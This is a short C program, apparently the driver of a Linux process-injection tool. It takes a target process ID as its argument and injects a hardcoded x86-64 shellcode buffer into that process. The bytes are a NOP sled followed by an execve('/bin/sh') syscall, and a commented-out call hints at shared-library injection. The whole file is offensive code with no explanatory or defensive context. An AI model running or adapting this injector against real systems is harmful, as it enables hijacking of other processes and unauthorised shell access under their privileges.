#include <stdio.h>
#include <stdlib.h>

#include "inject.h"

unsigned char shellcode[] = "\x90\x90\x90\x48\x31\xc0\x50\x48\x31\xf6\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x54\x5f\xb8\x3b\x00\x00\x00\x0f\x05";



int main(int argc, char* argv[]) {

	int pid = 0;

	if(argc != 2){
		printf("[-] Improper number of args...\n");
		return EXIT_FAILURE;
	}
	pid = atoi(argv[1]);

	inject_shellcode(pid, shellcode, sizeof(shellcode), 0);
	//inject_so();

    return 0;
}